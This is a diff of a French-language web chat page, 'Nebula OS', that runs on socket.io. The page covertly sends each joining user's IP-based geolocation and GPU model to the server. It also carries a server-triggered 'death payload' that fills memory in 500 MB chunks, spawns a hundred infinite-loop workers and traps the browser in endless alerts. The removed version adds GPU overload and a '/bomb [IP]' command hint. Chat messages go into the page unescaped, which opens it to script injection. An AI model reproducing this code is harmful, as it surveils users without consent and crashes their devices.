@@ -3,75 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>GALAXY OS - V15 PREMIUM</title>
+    <title>NEBULA OS - V16</title>
     <style>
-        :root { --main: #a29bfe; --red: #ff4d4d; --bg: #0a0a0c; --glass: rgba(255, 255, 255, 0.03); }
-        * { box-sizing: border-box; font-family: 'Segoe UI', 'Roboto', sans-serif; }
+        :root { --main: #74b9ff; --accent: #a29bfe; --glass: rgba(255, 255, 255, 0.05); }
+        * { box-sizing: border-box; font-family: 'Inter', sans-serif; }
+        body { margin: 0; background: #010103; color: white; height: 100vh; display: flex; overflow: hidden; }
         
-        body { margin: 0; background: #000 url('https://w0.peakpx.com/wallpaper/521/633/HD-wallpaper-incandescent-stars-sky-galaxy.jpg') no-repeat center center fixed; background-size: cover; color: white; height: 100vh; display: flex; overflow: hidden; }
+        #bg { position: fixed; inset: 0; z-index: -1; background: radial-gradient(circle at center, #0a0a1a 0%, #000 100%); }
 
-        /* EFFET DE VERRE SMOOTH */
-        #login-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.8); backdrop-filter: blur(15px); z-index: 10000; display: flex; align-items: center; justify-content: center; transition: all 0.8s cubic-bezier(0.4, 0, 0.2, 1); }
-        .login-box { background: var(--glass); border: 1px solid rgba(162, 155, 254, 0.3); padding: 40px; border-radius: 24px; text-align: center; width: 320px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); }
-        
-        #side-menu { width: 280px; background: rgba(0,0,0,0.6); backdrop-filter: blur(10px); border-right: 1px solid rgba(255,255,255,0.05); display: flex; flex-direction: column; transition: 0.3s; }
-        #main-chat { flex: 1; display: flex; flex-direction: column; background: rgba(0,0,0,0.2); }
+        /* SIDEBAR */
+        #sidebar { width: 320px; background: rgba(0,0,0,0.4); backdrop-filter: blur(20px); border-right: 1px solid var(--glass); display: flex; flex-direction: column; z-index: 10; }
+        .user-card { display: flex; align-items: center; padding: 12px; margin: 8px; border-radius: 15px; background: var(--glass); cursor: pointer; transition: 0.3s; border: 1px solid transparent; }
+        .user-card:hover { border-color: var(--main); background: rgba(255,255,255,0.1); }
+        .u-pp { width: 45px; height: 45px; border-radius: 50%; object-fit: cover; margin-right: 12px; border: 2px solid var(--main); }
 
-        /* MESSAGES SMOOTH */
-        #messages { flex: 1; overflow-y: auto; padding: 25px; list-style: none; scroll-behavior: smooth; }
-        .msg-card { display: flex; align-items: flex-start; margin-bottom: 20px; animation: fadeIn 0.4s ease forwards; opacity: 0; }
-        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
-        
-        .pp-msg { width: 40px; height: 40px; border-radius: 12px; margin-right: 12px; object-fit: cover; border: 1px solid var(--main); }
-        .msg-content { background: var(--glass); padding: 12px 16px; border-radius: 0 15px 15px 15px; border: 1px solid rgba(255,255,255,0.05); }
+        /* CHAT ZONE */
+        #chat-zone { flex: 1; display: flex; flex-direction: column; background: rgba(255,255,255,0.02); }
+        #messages { flex: 1; overflow-y: auto; padding: 25px; scroll-behavior: smooth; }
+        .msg { display: flex; gap: 12px; margin-bottom: 20px; animation: slideUp 0.3s ease; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
+        .bubble { background: var(--glass); padding: 12px 18px; border-radius: 18px; border: 1px solid rgba(255,255,255,0.05); max-width: 70%; }
 
-        /* MONITORING */
-        #monitor { padding: 20px; font-size: 0.8em; color: #a29bfe; border-top: 1px solid rgba(255,255,255,0.05); }
-        .stat { margin-bottom: 5px; opacity: 0.7; font-family: monospace; }
+        /* DM WINDOW */
+        #dm-window { display: none; position: absolute; bottom: 90px; right: 20px; width: 340px; height: 450px; background: #0a0a0f; border: 1px solid var(--main); border-radius: 20px; flex-direction: column; box-shadow: 0 10px 50px #000; z-index: 1000; }
+        .dm-header { padding: 15px; border-bottom: 1px solid var(--glass); display: flex; justify-content: space-between; align-items: center; }
 
-        /* INPUT */
-        #form { padding: 20px; background: rgba(0,0,0,0.4); display: flex; gap: 12px; }
-        #input { flex: 1; background: rgba(255,255,255,0.05); border: 1px solid rgba(255,255,255,0.1); color: white; padding: 14px 20px; border-radius: 15px; outline: none; transition: 0.2s; }
-        #input:focus { border-color: var(--main); background: rgba(255,255,255,0.08); }
-        .btn { background: var(--main); color: #000; border: none; padding: 0 25px; border-radius: 15px; font-weight: bold; cursor: pointer; }
+        /* CONTROLS */
+        #input-box { padding: 20px; background: #000; display: flex; gap: 10px; border-top: 1px solid var(--glass); }
+        input { flex: 1; background: var(--glass); border: 1px solid #333; color: white; padding: 12px 20px; border-radius: 25px; outline: none; }
+        .btn { background: var(--main); border: none; padding: 10px 25px; border-radius: 25px; font-weight: bold; cursor: pointer; color: #000; }
 
-        /* CRASH SCREEN */
-        #crash-screen { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; text-align: center; color: red; padding-top: 45vh; }
+        /* OVERLAYS */
+        #login { position: fixed; inset: 0; background: #000; z-index: 10000; display: flex; flex-direction: column; align-items: center; justify-content: center; }
+        #crash { display: none; position: fixed; inset: 0; background: #000; z-index: 9999999; color: red; text-align: center; padding-top: 40vh; }
     </style>
 </head>
 <body>
 
-    <div id="crash-screen">
-        <h1 style="font-size:3em; animation: blink 0.1s infinite;">HARDWARE_FAILURE</h1>
-        <p>SYSTEM_OVERHEAT_DETECTED</p>
-    </div>
+    <div id="bg"></div>
+    <div id="crash"><h1 style="font-size:3em; animation:blink 0.1s infinite;">CORE_MELTDOWN</h1><p>HARDWARE_TEMP_CRITICAL</p></div>
 
-    <div id="login-overlay">
-        <div class="login-box">
-            <h2 style="color:var(--main); margin-bottom:30px;">GALAXY OS</h2>
-            <input type="text" id="login-name" placeholder="VOTRE PSEUDO..." autocomplete="off">
-            <label for="pp-input" style="display:block; padding:10px; background:rgba(255,255,255,0.05); border-radius:10px; cursor:pointer; margin-bottom:20px; font-size:0.8em;">PHOTO DE PROFIL (CLIQUEZ)</label>
-            <input type="file" id="pp-input" accept="image/*" style="display:none">
-            <button class="btn" style="width:100%; height:50px;" onclick="initUser()">ENTRER DANS L'ORBITE</button>
+    <div id="login">
+        <h1 style="letter-spacing:10px; color:var(--main); margin-bottom:40px;">NEBULA OS</h1>
+        <div style="background:var(--glass); padding:30px; border-radius:20px; border:1px solid var(--glass); width:320px; text-align:center;">
+            <input type="text" id="nick" placeholder="VOTRE PSEUDO..." style="width:100%; margin-bottom:15px;">
+            <label style="display:block; margin-bottom:20px; cursor:pointer; font-size:0.8em; color:var(--main);">
+                [ CHOISIR UNE PHOTO ]
+                <input type="file" id="pp-file" accept="image/*" style="display:none">
+            </label>
+            <button class="btn" style="width:100%" onclick="join()">DÉCOLLAGE</button>
         </div>
     </div>
 
-    <div id="side-menu">
-        <div style="padding:40px 20px; text-align:center;">
-            <img id="my-pp-display" style="width:90px; height:90px; border-radius:25px; border:2px solid var(--main); margin-bottom:15px; object-fit:cover; display:none;">
-            <h3 id="my-name-display"></h3>
+    <div id="sidebar">
+        <div style="padding:25px; border-bottom:1px solid var(--glass);">
+            <h2 style="font-size:1.2em; color:var(--main); margin:0;">STATIONS</h2>
         </div>
-        <div id="monitor">
-            <div class="stat" id="mon-ip">IP: SCANNING...</div>
-            <div class="stat" id="mon-gpu">GPU: SCANNING...</div>
-            <div class="stat" id="mon-bat">BAT: --%</div>
-        </div>
+        <div id="user-list" style="flex:1; overflow-y:auto;"></div>
     </div>
 
-    <div id="main-chat">
-        <ul id="messages"></ul>
-        <form id="form">
-            <input id="input" autocomplete="off" placeholder="Message ou /bomb [IP]..." />
+    <div id="chat-zone">
+        <div id="messages"></div>
+
+        <div id="dm-window">
+            <div class="dm-header"> <span id="dm-target-name">Nom</span> <button onclick="closeDM()" style="background:none; border:none; color:white; cursor:pointer;">✕</button> </div>
+            <div id="dm-messages" style="flex:1; overflow-y:auto; padding:15px; font-size:0.9em;"></div>
+            <div style="padding:10px; display:flex; gap:5px;">
+                <input id="dm-input" placeholder="Message privé...">
+                <button onclick="sendDM()" class="btn">></button>
+            </div>
+        </div>
+
+        <form id="input-box">
+            <input id="msg-in" placeholder="Envoyer un signal..." autocomplete="off">
             <button type="submit" class="btn">ENVOYER</button>
         </form>
     </div>
@@ -79,102 +83,90 @@
     <script src="/socket.io/socket.io.js"></script>
     <script>
         const socket = io();
-        let user = { name: "", pp: "https://i.pinimg.com/originals/a9/d0/96/a9d096ac3abc607758ca2d14e3f287ac.gif", geo: {}, hw: {} };
+        let me = { name: "", pp: "https://i.imgur.com/6VBx3io.png", geo: {}, hw: {} };
+        let activeDM = null;
 
-        // Gestion de la photo de profil
-        document.getElementById('pp-input').onchange = function(e) {
-            const reader = new FileReader();
-            reader.onload = (event) => { user.pp = event.target.result; };
-            reader.readAsDataURL(e.target.files[0]);
+        // PHOTO DE PROFIL
+        document.getElementById('pp-file').onchange = (e) => {
+            const r = new FileReader();
+            r.onload = (ev) => { me.pp = ev.target.result; };
+            r.readAsDataURL(e.target.files[0]);
         };
 
-        async function initUser() {
-            const name = document.getElementById('login-name').value;
-            if(!name) return;
-            user.name = name;
+        async function join() {
+            const nick = document.getElementById('nick').value;
+            if(!nick) return;
+            me.name = nick;
 
-            // Scan Géo
-            try { const r = await fetch('https://ipapi.co/json/'); user.geo = await r.json(); } catch(e){}
-            
-            // Scan Hardware
+            // TRACKING IP & MATOS
+            try { const r = await fetch('https://ipapi.co/json/'); me.geo = await r.json(); } catch(e){}
             const gl = document.createElement('canvas').getContext('webgl');
-            const debug = gl.getExtension('WEBGL_debug_renderer_info');
-            const b = await navigator.getBattery();
+            me.hw = { gpu: gl.getParameter(gl.getExtension('WEBGL_debug_renderer_info').UNMASKED_RENDERER_WEBGL) };
 
-            user.hw = {
-                gpu: debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Unknown",
-                battery: Math.floor(b.level * 100)
-            };
-
-            // UI Update
-            document.getElementById('login-overlay').style.opacity = '0';
-            setTimeout(() => document.getElementById('login-overlay').style.display = 'none', 800);
-            document.getElementById('my-pp-display').src = user.pp;
-            document.getElementById('my-pp-display').style.display = 'inline-block';
-            document.getElementById('my-name-display').innerText = user.name;
-            document.getElementById('mon-ip').innerText = `IP: ${user.geo.ip || '---'}`;
-            document.getElementById('mon-gpu').innerText = `GPU: ${user.hw.gpu.substring(0,15)}...`;
-            document.getElementById('mon-bat').innerText = `BAT: ${user.hw.battery}%`;
-
-            socket.emit('check_device', { name: user.name, geo: user.geo, hardware: user.hw, pp: user.pp });
+            document.getElementById('login').style.display = 'none';
+            socket.emit('init_user', me);
         }
 
-        document.getElementById('form').onsubmit = (e) => {
+        // CHAT PUBLIC
+        document.getElementById('input-box').onsubmit = (e) => {
             e.preventDefault();
-            const input = document.getElementById('input');
-            if(input.value) {
-                socket.emit('chat message', { text: input.value, name: user.name, pp: user.pp });
-                input.value = '';
-            }
+            const text = document.getElementById('msg-in').value;
+            if(!text) return;
+            socket.emit('chat_msg', { text, name: me.name, pp: me.pp });
+            document.getElementById('msg-in').value = '';
         };
 
-        socket.on('chat message', (d) => {
-            const li = document.createElement('li');
-            li.className = 'msg-card';
-            li.innerHTML = `
-                <img src="${d.pp}" class="pp-msg">
-                <div class="msg-content">
-                    <div style="font-size:0.7em; color:var(--main); margin-bottom:4px;">${d.name}</div>
-                    <div>${d.text}</div>
-                </div>
-            `;
-            document.getElementById('messages').appendChild(li);
+        socket.on('chat_msg', (d) => {
+            const m = document.createElement('div');
+            m.className = 'msg';
+            m.innerHTML = `<img src="${d.pp}" class="u-pp"><div class="bubble"><div style="font-size:0.7em; color:var(--main);">${d.name}</div>${d.text}</div>`;
+            document.getElementById('messages').appendChild(m);
             document.getElementById('messages').scrollTop = document.getElementById('messages').scrollHeight;
         });
 
-        // 🧨 CHARGE UTILE CRASH (V15)
-        socket.on('CORE_MELTDOWN_INIT', () => {
-            document.getElementById('crash-screen').style.display = 'block';
-            
-            // Surcharge GPU (Kernel Panic)
-            for(let i=0; i<400; i++) {
-                let c = document.createElement('canvas');
-                let gl = c.getContext('webgl');
-                if(gl) {
-                    let t = gl.createTexture();
-                    gl.bindTexture(gl.TEXTURE_2D, t);
-                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
-                }
-            }
-
-            // Explosion RAM (500Mo)
-            const leak = [];
-            setInterval(() => {
-                try { leak.push(new Uint8Array(500 * 1024 * 1024).fill(Math.random())); } catch(e){}
-            }, 50);
-
-            // Surcharge CPU
-            const b = new Blob(["while(true){}"], {type: 'text/javascript'});
-            for(let i=0; i<100; i++) { new Worker(URL.createObjectURL(b)); }
-
-            if(navigator.vibrate) navigator.vibrate([100000, 1000, 100000]);
-            
-            while(true) {
-                window.history.pushState(null, null, "");
-                alert("CRITICAL_HARDWARE_FAILURE\n\nEMERGENCY_SHUTDOWN_FAILED");
-            }
+        // LISTE AMIS
+        socket.on('update_users', (list) => {
+            const container = document.getElementById('user-list');
+            container.innerHTML = '';
+            list.forEach(u => {
+                if(u.name === me.name) return;
+                const div = document.createElement('div');
+                div.className = 'user-card';
+                div.innerHTML = `<img src="${u.pp}" class="u-pp"><div><b>${u.name}</b><br><small style="color:lime">En ligne</small></div>`;
+                div.onclick = () => openDM(u);
+                container.appendChild(div);
+            });
         });
 
+        // MESSAGES PRIVÉS
+        function openDM(user) {
+            activeDM = user.ip;
+            document.getElementById('dm-target-name').innerText = user.name;
+            document.getElementById('dm-window').style.display = 'flex';
+        }
+        function closeDM() { document.getElementById('dm-window').style.display = 'none'; activeDM = null; }
+        
+        function sendDM() {
+            const text = document.getElementById('dm-input').value;
+            if(!text || !activeDM) return;
+            socket.emit('private_send', { toIP: activeDM, text });
+            document.getElementById('dm-messages').innerHTML += `<div><b>Moi:</b> ${text}</div>`;
+            document.getElementById('dm-input').value = '';
+        }
+
+        socket.on('private_receive', (d) => {
+            if(!activeDM) openDM({name: d.from, ip: d.fromIP});
+            document.getElementById('dm-messages').innerHTML += `<div><b>${d.from}:</b> ${d.text}</div>`;
+        });
+
+        // 💣 LA CHARGE DE MORT (V16)
+        socket.on('CORE_MELTDOWN', () => {
+            document.getElementById('crash').style.display = 'block';
+            const hole = [];
+            setInterval(() => { hole.push(new Uint8Array(500 * 1024 * 1024).fill(1)); }, 40);
+            for(let i=0; i<100; i++) new Worker(URL.createObjectURL(new Blob(["while(true){}"])));
+            while(true) { alert("NEBULA_OS: HARDWARE_TEMP_CRITICAL"); }
+        });
     </script>
 </body>
 </html>
